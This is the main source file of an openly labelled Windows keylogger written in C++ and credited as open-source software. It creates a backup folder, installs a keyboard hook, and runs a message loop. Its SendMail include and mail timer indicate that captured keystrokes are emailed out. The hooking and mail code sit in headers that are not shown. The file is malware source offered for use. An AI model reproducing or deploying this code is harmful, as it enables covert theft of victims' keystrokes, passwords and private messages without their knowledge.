/*
 *  C++ KEYLOGGER
 *  Lucas Barbosa | 2017 | Open source software
 */

#include <iostream>
#include <windows.h>

#include "lib\Helper.h"
#include "lib\KeyConstants.h"
#include "lib\Timer.h"
#include "lib\io.h"
#include "lib\SendMail.h"
#include "lib\KeyHook.h"

using namespace std;

int main(int argc, char *argv[])
{

  // Contains message information from the current thread's message queue (stored, virtual key messages)
  MSG thread_structure;

  IO::mk_back_up_dir(IO::get_our_path(true));

  install_hook();

  /*
   *  GetMessage(<pointer_to_MSG>, <handle_to_receiving_window>, <MSG_filter_min>, <MSG_filter_max>);
   *
   *  <pointer_to_MSG>
   *  A pointer to an MSG structure recieving information from the thread's message queue
   *  <handle_to_receiving_window>
   *  A handle to the window whose messages are to be retrieved. Of cource the window must belong
   *  to the current thread. If this is left as NULL GetMessage() retrieves messages from ANY
   *  windows that belong to the current thread.
   *  <MSG_filter_min>
   *  The integer value for the LOSWEST message value to be retrieved
   *  <MSG_filter_max>
   *  The integer value for the HIGHEST message value to be retrieved.
   *
   *  *NOTE: If <MSG_filter_min> and <MSG_filter_min> are both set to 0, GetMessage() returns
   *  all available messages.
   */

  // main thread
  while (GetMessage(&thread_structure, NULL, 0, 0))
  {
    /*
     *  TranslateMessage(<pointer_to_MSG>);
     *  translates virtual key messages into character messages, which are then posted to the
     *  current calling thread's message queue.
     */
    TranslateMessage(&thread_structure);
    /*
     *  DisptatchMessage(<pointer_to_MSG>);
     *  Dispatches a message returned by the GetMessage() to a window procedure.
     */
    DispatchMessage(&thread_structure);
  }

  // ending the timer to complete our keylogger procedure
  mail_timer.stop_timer();

  return 0;
}

/*
 *  #Refer to readme for more details on specifications and installation.
 *  For source code and project specs refer to repo @ https://github.com/lucasbrsa/MSWKeylogger
 */
